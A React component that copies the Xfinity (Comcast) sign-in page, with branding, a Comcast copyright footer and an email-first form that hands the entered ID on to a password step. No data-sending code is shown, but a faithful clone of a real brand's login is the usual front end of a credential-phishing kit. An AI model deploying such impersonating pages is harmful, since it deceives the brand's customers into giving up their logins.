import { useState } from "react";
import { useNavigate } from "react-router-dom";
import heroImage from "@/assets/xfinity-hero.jpg";

const LoginEmail = () => {
  const [email, setEmail] = useState("");
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const navigate = useNavigate();

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!email.trim()) {
      setError("Please enter your Xfinity ID.");
      return;
    }
    setError("");
    setLoading(true);
    setTimeout(() => {
      setLoading(false);
      navigate("/login/password", { state: { email } });
    }, 600);
  };

  return (
    <main className="min-h-screen flex flex-col bg-background">
      {/* Split area */}
      <div className="flex flex-1 flex-col md:flex-row">
        {/* LEFT – Form */}
        <div className="flex flex-1 items-center justify-center px-6 py-12 md:px-16">
          <div className="w-full max-w-md space-y-8">
            {/* Logo text */}
            <span className="text-2xl font-bold tracking-tight text-foreground">xfinity</span>

            <div className="space-y-2">
              <h1 className="text-3xl font-bold text-foreground">Sign in with your Xfinity&nbsp;ID</h1>
              <p className="text-muted-foreground">Enter your Xfinity&nbsp;ID</p>
            </div>

            <form onSubmit={handleSubmit} className="space-y-5">
              <div>
                <input
                  type="text"
                  placeholder="Email, mobile, or username"
                  value={email}
                  onChange={(e) => { setEmail(e.target.value); setError(""); }}
                  className="w-full rounded-lg border border-border bg-background px-4 py-3 text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-ring"
                />
                {error && <p className="mt-1 text-sm text-destructive">{error}</p>}
              </div>

              <button
                type="submit"
                disabled={loading}
                className="w-full rounded-lg bg-xfinity-purple py-3 font-semibold text-primary-foreground transition hover:bg-xfinity-purple-hover disabled:opacity-60"
              >
                {loading ? (
                  <span className="inline-flex items-center gap-2">
                    <svg className="h-4 w-4 animate-spin" viewBox="0 0 24 24" fill="none">
                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z" />
                    </svg>
                    Loading…
                  </span>
                ) : (
                  "Let's go"
                )}
              </button>
            </form>

            <p className="text-xs text-muted-foreground">
              By signing in, you agree to our{" "}
              <a href="#" className="text-xfinity-link underline">Terms of Service</a> and{" "}
              <a href="#" className="text-xfinity-link underline">Privacy Policy</a>.
            </p>

            <div className="space-y-2 text-sm">
              <a href="#" className="block text-xfinity-link hover:underline">View exclusive offers</a>
              <a href="#" className="block text-xfinity-link hover:underline">Find your Xfinity ID</a>
              <a href="#" className="block text-xfinity-link hover:underline">Create new Xfinity ID</a>
            </div>
          </div>
        </div>

        {/* RIGHT – Image (hidden on mobile) */}
        <div className="hidden md:block md:w-[60%] relative">
          <img
            src={heroImage}
            alt="Family enjoying Xfinity entertainment"
            className="absolute inset-0 h-full w-full object-cover"
            width={960}
            height={1080}
          />
          <div className="absolute inset-0 bg-foreground/10" />
        </div>
      </div>

      {/* Footer – only on page 1, below split */}
      <footer className="border-t border-border bg-xfinity-footer-bg px-6 py-4">
        <div className="mx-auto flex max-w-7xl flex-wrap items-center gap-x-6 gap-y-2 text-xs text-xfinity-footer-fg">
          <span>© 2026 Comcast</span>
          <a href="#" className="hover:underline">Web Terms Of Service</a>
          <a href="#" className="hover:underline">Privacy Policy</a>
          <a href="#" className="hover:underline">Cookie Preferences</a>
          <a href="#" className="hover:underline">Ad Choices</a>
          <a href="#" className="hover:underline">Accessibility</a>
        </div>
      </footer>
    </main>
  );
};

export default LoginEmail;
